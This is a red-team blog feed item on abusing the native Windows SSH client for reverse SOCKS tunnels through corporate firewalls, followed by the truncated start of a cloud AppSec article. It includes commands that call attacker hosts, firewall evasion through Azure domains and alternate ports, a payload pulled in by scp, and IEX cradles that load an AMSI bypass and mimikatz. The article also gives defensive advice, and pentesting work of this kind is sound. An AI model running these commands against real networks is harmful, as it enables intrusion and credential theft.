&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;Let’s cut to the chase&lt;span class=&#34;absolute -mt-20&#34; id=&#34;lets-cut-to-the-chase&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#lets-cut-to-the-chase&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The OpenSSH client is natively available in almost all Windows machines with an OS / Service Pack later than early 2018, more specifically Win10 v1709 and Win Server v1803. (To the Windows sysadmin reading this, you don’t have to use Putty anymore!)&lt;/p&gt;
&lt;p&gt;Furthermore, the stars were so aligned in 2017 that, right before Microsoft ported OpenSSH to Windows, the OpenSSH project implemented the reverse dynamic proxy feature, a bit obscurely (if you ask me!) reusing the -R flag &lt;a href=&#34;https://www.openssh.com/txt/release-7.6&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;in version 7.6&lt;/a&gt;. (This has been explained in the ChangeLog for 7 years but yet not many people are talking about this, which shows that RTFM does, in fact, often pay off.)&lt;/p&gt;
&lt;p&gt;In 2024, corporate laptops or workstations are almost universally on either Windows 10 or 11, and that means the ssh command is, on most pentesting or adversarial gigs, sitting in the PATH of the client’s machine without needing us to install or enable anything extra.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;To make this as unambiguous as I can - the &lt;strong&gt;native&lt;/strong&gt; ssh command on Windows 10/11 devices has been allowing anyone to start a reverse &amp;amp; dynamic SOCKS proxy into any internal network since 2017! And that makes it possible to run tools like Impacket scripts, Netexec (formerly Crackmapexec) or Certipy natively behind the SOCKS proxy on a remote Linux server, while to the defender the traffic appears to originate from the compromised machine.&lt;/em&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;And in 2024, many corporate firewalls still allow SSH outbound from workstations, or are configured in such a way that it is relatively trivial to bypass, and blue teams are often not watching ssh being executed because of how much of a LOLBIN it is.&lt;/p&gt;
&lt;h2&gt;3 Tricks to punch through Corporate firewalls&lt;span class=&#34;absolute -mt-20&#34; id=&#34;3-tricks-to-punch-through-corporate-firewalls&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#3-tricks-to-punch-through-corporate-firewalls&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;1. Basic form: -R&lt;span class=&#34;absolute -mt-20&#34; id=&#34;1-basic-form--r&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#1-basic-form--r&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;On the compromised Windows or Nix machine, run SSH with either the binary&amp;rsquo;s name:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh -R PROXY_PORT user@attacker_server.com&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Or use the full path, on for example port 8888&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;C:\Windows\System32\OpenSSH\ssh.exe -R 8888 user@attacker_server.com&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;On assumed breach gigs we have a quick trick to check whether outbound SSH is allowed which I will elaborate in the next section.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/screenshot1.png&#34; title=&#34;screenshot1&#34; alt=&#34;ssh_screenshot1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;screenshot1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Here we assume you have a VPS with a static IP / DNS record pointing to the VPS, on the internet. If you so choose to use password authentication, do set up IP allowlisting on your client’s and your own egress IP only to avoid being brute-forced. Then on your VPS / attacking server, set up /etc/proxychains.conf as usual. Specifying the remote server’s proxychains.conf to use SOCKS5 would enable the additional compatibility of UDP and thus DNS lookups through the tunnel as well:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;socks5 	127.0.0.1 8888&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Then you could run your commands on the attacking box with proxychains:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;proxychains nmap -sT -F internal_target_ip
proxychains nxc smb internal_target_ip -u USER -p PASSWD --shares
proxychains secretsdump.py ... and so on&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;On Red Siege’s &lt;a href=&#34;https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SSHishing&lt;/a&gt; blog post the author described &lt;a href=&#34;https://superuser.com/questions/1489017/login-to-ssh-with-no-password-and-no-ssh-key&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;not requiring a password OR key&lt;/a&gt; to login plus the -o &amp;ldquo;StrictHostKeyChecking=no&amp;rdquo; flag to disable the “Are you sure you want to continue connecting (Yes/No/Fingerprint)” message so that the command could be inside of an Lnk file or a Malicious Office macro, but I still have reservations regarding not requiring authentication to access your C2 server (even if it’s a limitaccess user with /bin/false as default shell).&lt;/p&gt;
&lt;h3&gt;2. Azure domain / ASN to get pass firewall&lt;span class=&#34;absolute -mt-20&#34; id=&#34;2-azure-domain--asn-to-get-pass-firewall&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#2-azure-domain--asn-to-get-pass-firewall&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;h4&gt;Azure Domains&lt;span class=&#34;absolute -mt-20&#34; id=&#34;azure-domains&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#azure-domains&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;A good indication of the client’s firewall having absolutely no blocks on SSH is when an SSH host that they almost certainly have no use for is allowed, such as:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh root@scanme.nmap.org
# if you get a  prompt, you&amp;#39;ve struck gold!
# pls don&amp;#39;t do anything abusive or malicious to scanme.nmap.org!&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Of course, it is not always so easy that it works right away, and whilst not in assumed breach you wouldn’t have the luxury of a PowerShell session to check the client’s firewall. So, what if Scanme is not reachable? The first thing I would try is to use a VPS on Azure. The underlying reason is that Windows environments are highly likely to be on Active Directory and most likely Hybrid. There is a high likelihood that the client’s stack requires either Microsoft own IPs to be allowlisted, or Azure subdomains to be blanket trusted.&lt;/p&gt;
&lt;p&gt;What I’d do is to spin up a VM from Azure and then give it an azure subdomain from the Public IP address settings: Public IP &amp;gt; Settings &amp;gt; Configuration &amp;gt; DNS name label (optional) -&amp;gt; Enter your desired subdomain name.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/screenshot2.png&#34; title=&#34;screenshot2&#34; alt=&#34;screenshot2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;screenshot2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh.exe -R 8888 user@innocent-looking-front.REGION.cloudapp.azure.com&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Something mundane such as msservicesupdate.uksouth.cloudapp.azure.com should be fine. This has been proven to work in many of our engagements.&lt;/p&gt;
&lt;h3&gt;ASN to the rescue&lt;span class=&#34;absolute -mt-20&#34; id=&#34;asn-to-the-rescue&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#asn-to-the-rescue&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Domains tend to have higher success rates on phish emails or C2 callbacks because corporate firewalls tend to block requests to raw non-internal IPs. However, &lt;a href=&#34;https://www.microsoft.com/en-us/security/blog/2021/03/26/securing-our-approach-to-domain-fronting-within-azure/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Azure domain fronting&lt;/a&gt; (some practitioners use Azure CDN fronting) is actually known to Microsoft themselves too. Perhaps the blue team / Sysadmin in the client knew this and blocked outbound access to *.region.cloudapp.azure.com for example because they know about this technique and give their own DNS hostnames to their Azure VMs?&lt;/p&gt;
&lt;p&gt;In this case even if the subdomain is blocked, you could / should try the raw IP anyway because it is on Microsoft owned ASN. I have had it happen that using the raw IP worked, so it is definitely worth a try when you’re desperate. The IP address would be in Microsoft’s ASN and there could be an allowlist somewhere that green lights the range.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh.exe -R 8888 limiteduser@1.2.3.4(azure_vm_ip)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;h3&gt;3. Alternative Egress Port&lt;span class=&#34;absolute -mt-20&#34; id=&#34;3-alternative-egress-port&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#3-alternative-egress-port&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Sometimes outbound port 22 to the internet is (fortunately or unfortunately) blocked on the client’s endpoint. However there’s also a catch that not all corporate firewalls inspect the underlying protocol / do SSL stripping and deep packet inspection (so-called Application Layer Firewalls). It is definitely worth a try to set the ssh port to non-22 on your VPS and restart SSHD. Port 80, 443, 53 tend to be good candidates for this to work. I’ve sometimes even seen Windows / AD ports outbound to be allowed, stuff I wouldn’t expect like NETBIOS(139), KERBEROS(88) , SMB(445), LDAP(389) but sometimes it is needed for certain Azure / Entra interaction. Of course classic service ports like SMTP(25), FTP(21) and so on are also within reason to try, but personally I’ve had less luck with those.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;# edit /etc/ssh/sshd_config with your favorite text editor
Port 

# save and close 
# don&amp;#39;t forget to allow inbound on this port from your IP on your cloud provider), then:

sudo systemctl restart sshd&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;h2&gt;(Bonus) What else could you do with this?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;bonus-what-else-could-you-do-with-this&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#bonus-what-else-could-you-do-with-this&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are a couple of use cases other than just running offensive tooling through an available outbound SSH connection:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Getting payloads in and data out:&lt;/strong&gt; If you can get SSH out, then either getting payload in or exfiltrate data out via SCP shouldn’t be a problem:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;scp.exe user@unsuspecting.uksouth.cloudapp.azure.com:/home/user/totally_okay_payload.dll C:\Public\AppData\version.dll&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;(More) OpSec safe In memory powershell script execution with IEX:&lt;/strong&gt; If you have a good Amsi bypass, ssh is a good way to grab it along with other powershell scripts, especially with how scrutinised Invoke-WebRequest is. The common way observed in the wild to invoke scripts is:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;IEX (New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.X.X.X/invoke-mimikatz.ps1&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;In a constrained PS environment the (New-Object) cmdlet would not even work, and secondly this command has been signatured to death so it’s probably not a smart thing to do in a covert job. However, you can run one command upon ssh-ing into a host in the format of:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;ssh user@server &amp;#34;command arg arg2 ...&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;p&gt;Essentially you can use this to cradle your AMSI bypass with a malicious script like so (this again can also be bundled into the Lnk file or a malicious macro):&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;IEX (ssh user@server &amp;#34;/usr/bin/cat /home/user/amsibypass.ps1&amp;#34;); IEX (ssh user@server &amp;#34;/usr/bin/cat /home/user/invoke-mimikatz.ps1&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;How to secure this?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;how-to-secure-this&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#how-to-secure-this&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Removing the SSH client:&lt;/strong&gt; It is recommended to remove the builtin SSH client for non-technical staff. It can be done by first removing the SSH client with Settings’ &amp;gt; ‘Apps’ &amp;gt; ‘Optional Features’ &amp;gt; Search for “OpenSSH” and hit Uninstall then reboot. It however is still in System32. Uninstalling the SSH client from the endpoint is not yet complete after this, as described in the PTP blog post. To further remove the binaries:&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;takeown /F C:\Windows\System32\OpenSSH /R /D Y
icacls C:\Windows\System32\OpenSSH /grant administrators:F /T
rmdir /s C:\Windows\System32\OpenSSH&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Secure the corporate firewall settings:&lt;/strong&gt; Even if the SSH client is no longer present in the endpoint, the attacker could still move a LOLBin version (signed by Microsoft) onto the user endpoint, or operate from an internal Linux /Mac machine for example. The first order of business is of course blocking outbound TCP connections on port 22 if it is not needed. I’m no firewall expert but for firewalls that support application level operations, SSL stripping with protocol inspection should be performed on ports not meant for SSH (443 and so on) and block connections where the protocols are not matched. There are probably no good recommendations from me for clients who need to allowlist Microsoft ASN IP or Azure subdomains for SSH access unfortunately. If the reader has good ideas on this by all means let me know!&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Monitor for the user endpoints for the SSH binary being called:&lt;/strong&gt; For non-technical staff, the SSH &amp;amp; SCP binaries have little reason to be called at all. A custom alert could be written fire off when SSH.exe or SCP.exe is called (optionally, with filehash matching as well).&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In summary, SSH.exe has been bundled with Windows 10, 11 &amp;amp; Windows Server since late 2017 and signed by Microsoft. The reverse dynamic proxy is very powerful and there are a number of tricks that can be used to punch through corporate firewalls to get a reliable tunnel for offensive tooling to compromise entire AD domains. Defenders are recommended to watch for invocation of this binary on endpoints used by non-technical users, or uninstall the feature entirely.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>How Cloud Migration is Affecting AppSec - A Red Teamer&#39;s Perspective</title>
      <link>//localhost:1313/articles/2024/07/2024-07-04-how-cloud-migration-is-affecting-appsec-a-red-teamers-perspective/</link>
      <pubDate>Thu, 04 Jul 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/07/2024-07-04-how-cloud-migration-is-affecting-appsec-a-red-teamers-perspective/</guid>
      <description>
        
        
        &lt;h2&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;I’ve recently spoken at several conferences about the changes that are underway within red teaming as a result of cloud migration. My team and I have been delivering majority cloud red team work over the last year and the differences are becoming more apparent by the day. One point I’ve mentioned as ‘controversial’ at several of these events is that cloud migration has actually made AppSec more important than ever. I went some way to trying to explain why I think this is during my talks, but it was something that I felt deserved its own blog post to explore in more detail, with clear examples of how compromise of an on-prem application can look different to a cloud-hosted one.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;disclaimer&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#disclaimer&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;AppSec is a huge domain and one that I will not try to pretend I am currently in a position to speak with authority on as I’ve been focused almost entirely on red teaming over the last few years. Whilst I was an application pentester many moons ago I will be discussing this topic from the perspective of a red teamer / threat actor looking to achieve notable impact from the compromise of an application, namely initial access into an organisation. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;The Traditional Approach&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-traditional-approach&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-traditional-approach&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;So, before jumping into the cloud-hosted application side of things, let’s briefly discuss the ‘traditional’ approach with which I will be comparing it to. Whilst there are countless ways of hosting a web application, let’s simplify it with a common setup looking something like the below image. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image8.png&#34; title=&#34;image8&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image8&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Reference: &lt;a href=&#34;https://www.wallarm.com/what/what-is-a-dmz&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.wallarm.com/what/what-is-a-dmz&lt;/a&gt;&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;reference&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#reference&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
